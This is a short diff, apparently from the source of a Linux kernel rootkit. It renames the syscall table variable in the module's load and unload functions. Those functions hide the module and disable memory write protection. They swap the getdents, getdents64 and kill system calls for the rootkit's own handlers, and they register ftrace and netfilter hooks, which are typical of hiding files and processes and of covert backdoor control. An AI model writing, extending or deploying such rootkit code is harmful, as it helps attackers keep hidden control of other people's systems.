@@ -32,21 +32,21 @@ static int bds_start(void) {
 	int err;
 	
 	bds_hide();
-	sys_call_table = get_syscall_table();
-	if (!sys_call_table) {
+	g_syscall_table = get_syscall_table();
+	if (!g_syscall_table) {
 		printk("[-] exit");
 		return -1;
 	}
 	cr0 = read_cr0();
-	orig_getdents = (t_syscall)sys_call_table[__NR_getdents];
-	orig_getdents64 = (t_syscall)sys_call_table[__NR_getdents64];
-	orig_kill = (t_syscall)sys_call_table[__NR_kill];
+	orig_getdents = (t_syscall)g_syscall_table[__NR_getdents];
+	orig_getdents64 = (t_syscall)g_syscall_table[__NR_getdents64];
+	orig_kill = (t_syscall)g_syscall_table[__NR_kill];
         
 	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	unprotect_memory();
-	sys_call_table[__NR_getdents] = (unsigned long) bds_getdents;
-	sys_call_table[__NR_getdents64] = (unsigned long) bds_getdents64;
-	sys_call_table[__NR_kill] = (unsigned long) bds_kill;
+	g_syscall_table[__NR_getdents] = (unsigned long) bds_getdents;
+	g_syscall_table[__NR_getdents64] = (unsigned long) bds_getdents64;
+	g_syscall_table[__NR_kill] = (unsigned long) bds_kill;
 	protect_memory();
 	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
 	nfho->hook  = (nf_hookfn*)bds_nf_hook;      
@@ -64,9 +64,9 @@ static int bds_start(void) {
 static void bds_end(void) {
 	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	unprotect_memory();
-	sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
-	sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
-	sys_call_table[__NR_kill] = (unsigned long) orig_kill;
+	g_syscall_table[__NR_getdents] = (unsigned long) orig_getdents;
+	g_syscall_table[__NR_getdents64] = (unsigned long) orig_getdents64;
+	g_syscall_table[__NR_kill] = (unsigned long) orig_kill;
     
 	protect_memory();
 	nf_unregister_net_hook(&init_net, nfho);
